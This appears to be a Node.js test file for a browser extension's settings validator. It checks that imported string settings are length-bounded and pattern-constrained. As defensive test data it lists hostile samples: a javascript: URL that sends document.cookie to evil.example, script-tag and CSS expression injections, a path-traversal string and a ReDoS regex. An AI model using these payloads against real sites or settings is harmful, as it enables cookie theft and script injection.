'use strict';

// `clampSettingValue` narrows numbers and coerces enums, but a `type: "string"`
// setting used to accept whatever a backup carried. That is how a catastrophic
// regex reached the Video Hider keyword filter and an arbitrary origin reached
// the alternative-frontend link: both were fixed at their own call sites, and
// the class stayed open at the boundary until these constraints landed.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const repoRoot = path.join(__dirname, '..');
const { SETTINGS_SCHEMA } = require('../extension/core/settings-schema.js');

function loadPolicy() {
    // The factory takes the schema explicitly. Passing it beats relying on the
    // module's own lookup: the first version of this harness loaded both files
    // into a vm where that lookup found nothing, so EVERY key came back
    // "unknown setting" and the refusal assertions passed for the wrong reason.
    const { createPolicyProfile } = require('../extension/core/policy-profile.js');
    return createPolicyProfile({ schema: SETTINGS_SCHEMA });
}

const freeFormStrings = SETTINGS_SCHEMA.filter(
    (entry) => entry.type === 'string' && !(Array.isArray(entry.enum) && entry.enum.length)
);

test('every free-form string setting declares a length bound', () => {
    const unbounded = freeFormStrings
        .filter((entry) => typeof entry.maxLength !== 'number')
        .map((entry) => entry.key);
    assert.deepEqual(unbounded, [],
        'an unbounded string setting accepts whatever a backup carries');
});

test('every declared constraint admits its own default', () => {
    // A constraint that rejects the shipped default would make a clean profile
    // unimportable, which is a worse failure than the one it guards.
    for (const entry of freeFormStrings) {
        const value = String(entry.defaultValue ?? '');
        assert.ok(value.length <= entry.maxLength,
            `${entry.key}: default is longer than its own maxLength`);
        if (entry.pattern) {
            assert.match(value, new RegExp(entry.pattern),
                `${entry.key}: default does not satisfy its own pattern`);
        }
    }
});

test('every schema pattern compiles', () => {
    for (const entry of freeFormStrings) {
        if (!entry.pattern) continue;
        assert.doesNotThrow(() => new RegExp(entry.pattern),
            `${entry.key}: pattern must be a valid regular expression`);
    }
});

test('an over-long value is refused at every bounded string key', () => {
    const policy = loadPolicy();
    for (const entry of freeFormStrings) {
        const hostile = 'a'.repeat(entry.maxLength + 1);
        const result = policy.validateSettingsSnapshot({ [entry.key]: hostile });
        assert.equal(result.ok, false, `${entry.key}: an over-long value must be refused`);
        assert.ok(!Object.prototype.hasOwnProperty.call(result.settings, entry.key),
            `${entry.key}: a refused value must not be stored`);
    }
});

test('a pattern-violating value is refused at every patterned key', () => {
    const policy = loadPolicy();
    // One hostile value per shape. Each is the thing the pattern exists to stop.
    const HOSTILE = [
        'javascript:fetch("//evil.example/"+document.cookie)',
        'http://evil.example',
        '<script>alert(1)</script>',
        'url(//evil.example/x.png)',
        '../../etc/passwd',
        'expression(alert(1))'
    ];
    for (const entry of freeFormStrings) {
        if (!entry.pattern) continue;
        const compiled = new RegExp(entry.pattern);
        const refused = HOSTILE.filter((value) => !compiled.test(value));
        assert.ok(refused.length > 0,
            `${entry.key}: its pattern admits every hostile sample, so it constrains nothing`);
        for (const value of refused) {
            const result = policy.validateSettingsSnapshot({ [entry.key]: value });
            assert.equal(result.ok, false,
                `${entry.key}: ${JSON.stringify(value).slice(0, 40)} must be refused`);
            assert.ok(!Object.prototype.hasOwnProperty.call(result.settings, entry.key),
                `${entry.key}: a refused value must not be stored`);
        }
    }
});

test('the two settings that already caused incidents are constrained', () => {
    const policy = loadPolicy();
    // The catastrophic regex from the ReDoS fix, oversized past the cap.
    const redos = '/' + '(a+)'.repeat(5000) + 'b/';
    const keyword = policy.validateSettingsSnapshot({ hideVideosKeywordFilter: redos });
    assert.equal(keyword.ok, false, 'an oversized keyword filter must be refused');

    // The open redirect from the alternative-frontend fix.
    for (const value of ['javascript:alert(1)', 'http://evil.example', 'data:text/html,x']) {
        const redirect = policy.validateSettingsSnapshot({ alternativeFrontendInstance: value });
        assert.equal(redirect.ok, false, `${value} must be refused as a frontend instance`);
    }
    // And the legitimate one still passes.
    const good = policy.validateSettingsSnapshot({ alternativeFrontendInstance: 'https://invidious.example' });
    assert.equal(good.ok, true, 'a real https instance must still import');
    assert.equal(good.settings.alternativeFrontendInstance, 'https://invidious.example');
});

test('ordinary values a user really sets still import', () => {
    const policy = loadPolicy();
    const REAL = {
        hideVideosKeywordFilter: 'sponsored, /crypto.*giveaway/i, clickbait',
        customCssCode: 'ytd-app { --my-var: 4px; }\n#content { padding: 2px; }',
        themeAccentColor: '#a78bfa',
        selectionColor: 'rgba(45, 211, 111, 0.4)',
        subStyleColor: 'white',
        transcriptPreferredLanguage: 'pt-BR',
        preferredAudioLang: 'en',
        aiSummaryModel: 'gpt-4o-mini',
        aiSummaryEndpoint: 'http://127.0.0.1:11434/v1/chat/completions',
        downloadCobaltInstance: 'https://cobalt.example/api/json',
        commentLanguageAllowlist: 'en, pt, es',
        quickLinkItems: 'History | /feed/history\nWatch Later | /playlist?list=WL'
    };
    for (const [key, value] of Object.entries(REAL)) {
        const result = policy.validateSettingsSnapshot({ [key]: value });
        assert.equal(result.ok, true,
            `${key}: a realistic value must import, got ${JSON.stringify(result.errors)}`);
        assert.equal(result.settings[key], value, `${key}: the value must survive unchanged`);
    }
});
